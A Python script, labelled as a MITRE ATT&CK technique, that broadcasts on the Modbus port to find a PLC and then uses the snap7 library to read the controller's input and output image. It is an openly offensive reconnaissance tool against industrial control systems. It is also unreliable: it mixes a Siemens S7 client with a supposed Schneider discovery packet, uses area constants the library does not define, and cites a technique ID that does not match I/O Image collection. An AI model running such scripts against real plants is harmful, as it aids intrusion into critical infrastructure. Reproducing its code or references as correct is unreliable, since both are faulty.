import snap7
import struct
import socket

# MITRE ATT&CK Technique: Collection - I/O Image (T1647)

# Configuration
PLC_IP = None  # Initialize PLC_IP to None, will be discovered if necessary
RACK = 0
SLOT = 1
DB_NUMBER = 1  # Doesn't matter for I/O access, but client needs a DB number
START_BYTE_INPUTS = 0
SIZE_INPUTS = 2  # Assuming 16 digital inputs, 2 bytes
START_BYTE_OUTPUTS = 0
SIZE_OUTPUTS = 1 # Assuming 8 digital outputs, 1 byte


def find_plc_ip():
    """
    Attempts to discover the PLC's IP address on the network.
    This is a very basic discovery method and might not work in all network configurations.
    It relies on broadcasting a discovery request and waiting for a response.

    Returns:
        str: The PLC's IP address if found, None otherwise.
    """
    global PLC_IP # Access global PLC_IP variable

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(5) # timeout after 5 seconds

    # Discovery message (example, modify as needed for Schneider PLC)
    message = b'READ_VAR' # or specific discovery packet
    address = ('<broadcast>', 502) # Modbus port

    try:
        sock.sendto(message, address)
        data, server = sock.recvfrom(1024)
        PLC_IP = server[0]
        print(f"PLC IP address found: {PLC_IP}")

    except socket.timeout:
        print("No PLC found on the network (Discovery Timeout)")
        return None
    except Exception as e:
        print(f"An error occurred during PLC discovery: {e}")
        return None
    finally:
        sock.close()


def collect_io_image(ip_address):
    """
    Connects to the PLC, reads the I/O image, and prints the values.

    Args:
        ip_address (str): The IP address of the PLC.
    """
    try:
        plc = snap7.client.Client()
        plc.connect(ip_address, RACK, SLOT)

        # Read Input Image (%I)
        inputs = plc.read_area(snap7.const.Areas.PA_I, DB_NUMBER, START_BYTE_INPUTS, SIZE_INPUTS)

        # Read Output Image (%Q)
        outputs = plc.read_area(snap7.const.Areas.PA_O, DB_NUMBER, START_BYTE_OUTPUTS, SIZE_OUTPUTS)

        print("I/O Image Collection:")
        print(f"  Inputs (%I):  {inputs.hex()}")
        print(f"  Outputs (%Q): {outputs.hex()}")


    except Exception as e:
        print(f"Error collecting I/O image: {e}")
    finally:
        if 'plc' in locals() and plc.get_connected():
            plc.disconnect()
            plc.destroy()


if __name__ == "__main__":
    # Attempt to discover the PLC IP if not explicitly provided.
    if PLC_IP is None:
        find_plc_ip()

    if PLC_IP:
        collect_io_image(PLC_IP)
    else:
        print("PLC IP address not found.  Please configure PLC_IP or ensure the PLC is discoverable.")